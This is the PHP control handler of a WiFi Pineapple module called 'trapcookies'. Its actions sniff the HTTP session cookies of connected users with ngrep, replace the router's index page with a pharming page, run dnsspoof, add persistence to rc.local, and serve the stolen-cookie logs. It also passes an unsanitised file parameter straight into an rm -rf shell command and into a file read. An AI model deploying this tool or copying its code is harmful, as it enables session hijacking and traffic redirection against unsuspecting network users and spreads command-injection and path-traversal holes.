<?php

require("/pineapple/components/infusions/trapcookies/handler.php");

global $directory;

require($directory."includes/vars.php");

if (isset($_GET['trapcookies']))
{
	if (isset($_GET['action']))
	{
		$action = $_GET['action'];
		
		switch($action)
		{
			case 'start':
				$time = time();
				$full_cmd = "ngrep -q -d br-lan -W byline -t 'Cookie' 'tcp and port 80' > ".$directory."includes/log/output_".$time.".log";

				shell_exec("echo \"#!/bin/sh\n".$full_cmd."\" > ".$directory."includes/trapcookies.sh && chmod +x ".$directory."includes/trapcookies.sh &");
				exec("echo ".$directory."includes/trapcookies.sh | at now");
			break;
			
			case 'stop':
				exec("killall ngrep");
			break;
		}
	}
}

if (isset($_GET['landing']))
{
	if (isset($_GET['action']))
	{
		$action = $_GET['action'];
		
		switch($action)
		{
			case 'install':
				exec("cp /www/index.php /www/index.php.backup && cp ".$directory."includes/index.php.pharm /www/index.php"); 
			break;
			
			case 'uninstall':
				exec("cp /www/index.php.backup /www/index.php && rm -rf /www/index.php.backup"); 
			break;
		}
	}
}

if (isset($_GET['dnsspoof']))
{
	if (isset($_GET['action']))
	{
		$action = $_GET['action'];
		
		switch($action)
		{
			case 'start':
				exec('echo "dnsspoof -i br-lan -f /etc/pineapple/spoofhost > /dev/null 2>/tmp/dnsspoof.log" | at now');
			break;
			
			case 'stop':
				exec("killall dnsspoof");
			break;
		}
	}
}

if (isset($_GET['load']))
{
	if (isset($_GET['file']))
	{
		$log_date = gmdate("F d Y H:i:s", filemtime($directory."includes/log/".$_GET['file']));
		echo "<strong>trapcookies log ".$_GET['file']." [".$log_date."]</strong><br/><br/>";
		
		echo '<textarea class="trapcookies" cols="85" rows="29">';
		echo htmlentities(file_get_contents($directory."includes/log/".$_GET['file']), ENT_QUOTES|ENT_SUBSTITUTE);
		echo '</textarea>';
	}
}

if (isset($_GET['download']))
{
	if (isset($_GET['file']))
	{
		$file = $directory."includes/log/".basename($_GET['file']);
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($file).'"'); 
		header('Content-Length: ' . filesize($file));
		readfile($file);
	}
}

if (isset($_GET['delete']))
{
	if (isset($_GET['file']))
	{
		if (isset($_GET['log']))
			exec("rm -rf ".$directory."includes/log/".$_GET['file']."*");
	}
}

if (isset($_GET['boot']))
{
	if (isset($_GET['action']))
	{
		$action = $_GET['action'];
		
		switch($action)
		{
			case 'enable':
				exec("sed -i '/exit 0/d' /etc/rc.local"); 
				exec("echo ".$directory."includes/autostart.sh >> /etc/rc.local");
				exec("echo exit 0 >> /etc/rc.local");
			break;
			
			case 'disable': 
				exec("sed -i '/trapcookies\/includes\/autostart.sh/d' /etc/rc.local");
			break;
		}
	}	
}

if (isset($_GET['install'])) 
{
	if (isset($_GET['where']))
	{
		$where = $_GET['where'];
		
		switch($where)
		{
			case 'sd': 
				exec("opkg update && opkg install ngrep --dest sd"); 
			break;
			
			case 'internal': 
				exec("opkg update && opkg install ngrep"); 
			break;
		}
	}
}

?>